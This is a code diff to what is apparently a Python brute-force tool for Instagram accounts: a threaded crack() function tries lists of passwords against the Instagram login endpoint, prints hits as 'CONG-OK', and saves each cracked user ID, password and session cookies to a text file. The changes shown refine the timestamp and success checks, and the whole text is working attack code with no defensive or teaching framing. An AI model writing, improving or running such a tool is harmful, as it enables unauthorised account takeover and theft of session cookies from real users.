@@ -10,7 +10,7 @@ import random
 import requests
 from requests.exceptions import ConnectionError
 from concurrent.futures import ThreadPoolExecutor
- 
+from datetime import datetime 
 ###-------[BASIC COLORS]-----------####
 reset = "\033[0m"
 red = "\033[1;31m"
@@ -132,7 +132,8 @@ def crack(uid, pww, total_idz):
     try:
         for pw in pww:
             session = requests.Session()
-            time_now = int(time.time())
+            time_now = int(datetime.now().timestamp())
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             cookies = {
                 'csrftoken': 'C-0gmeW0GBKNePMGhh4dUW',
                 'dpr': '2.200000047683716',
@@ -141,7 +142,7 @@ def crack(uid, pww, total_idz):
                 'ig_did': 'C2E9E8CB-9BE1-4012-BB25-325BE285835B',
                 'wd': '491x571',}
             data = {
-                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}",
+                "enc_password": enc_password,
                 'optIntoOneTap': 'false',
                 'queryParams': '{"hl":"en"}',
                 'trustedDeviceRecords': '{}',
@@ -175,15 +176,15 @@ def crack(uid, pww, total_idz):
             response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
             if response.status_code == 200:
                 json_response = response.json()
-                if json_response.get('authenticated'):
+                if 'authenticated' in json_response and json_response['authenticated']:
                         session_cookies = response.cookies.get_dict()
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
                         oks.append(uid)
                         break
-                else:
-                    print("Login failed:", json_response.get('message'))
+                elif 'status' in json_response and json_response['status'] == 'fail':
+                    print(f"\r\033[1;91m [FAIL] {uid} | {pw}")
                     break
             else:
                 print("Request failed with status code:", response.status_code)
